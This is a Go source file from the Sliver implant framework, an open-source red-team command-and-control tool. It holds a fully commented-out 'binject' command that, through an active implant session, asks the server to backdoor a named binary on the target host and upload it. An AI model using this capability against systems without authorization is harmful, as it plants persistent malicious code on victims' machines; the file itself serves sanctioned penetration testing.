package command

// /*
// 	Sliver Implant Framework
// 	Copyright (C) 2019  Bishop Fox

// 	This program is free software: you can redistribute it and/or modify
// 	it under the terms of the GNU General Public License as published by
// 	the Free Software Foundation, either version 3 of the License, or
// 	(at your option) any later version.

// 	This program is distributed in the hope that it will be useful,
// 	but WITHOUT ANY WARRANTY; without even the implied warranty of
// 	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// 	GNU General Public License for more details.

// 	You should have received a copy of the GNU General Public License
// 	along with this program.  If not, see <https://www.gnu.org/licenses/>.
// */

// import (
// 	"context"
// 	"fmt"

// 	"github.com/bishopfox/sliver/client/spin"
// 	"github.com/bishopfox/sliver/protobuf/rpcpb"
// 	"github.com/bishopfox/sliver/protobuf/sliverpb"
// 	"github.com/desertbit/grumble"
// )

// func binject(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
// 	session := ActiveSession.Get()
// 	if session == nil {
// 		fmt.Println(Warn + "Please select an active session via `use`")
// 		return
// 	}

// 	remoteFilePath := ctx.Args.String("remote-file")
// 	if remoteFilePath == "" {
// 		fmt.Println(Warn + "Please provide a remote file path. See `help backdoor` for more info")
// 		return
// 	}

// 	profileName := ctx.Flags.String("profile")

// 	ctrl := make(chan bool)
// 	msg := fmt.Sprintf("Backdooring %s ...", remoteFilePath)
// 	go spin.Until(msg, ctrl)
// 	backdoor, err := rpc.Backdoor(context.Background(), &sliverpb.BackdoorReq{
// 		FilePath:    remoteFilePath,
// 		ProfileName: profileName,
// 		Request:     ActiveSession.Request(ctx),
// 	})
// 	ctrl <- true
// 	<-ctrl
// 	if err != nil {
// 		fmt.Printf(Warn+"Error: %v", err)
// 		return
// 	}

// 	if backdoor.Response != nil && backdoor.Response.Err != "" {
// 		fmt.Printf(Warn+"Error: %s\n", backdoor.Response.Err)
// 		return
// 	}

// 	fmt.Printf(Info+"Uploaded backdoored binary to %s\n", remoteFilePath)

// }
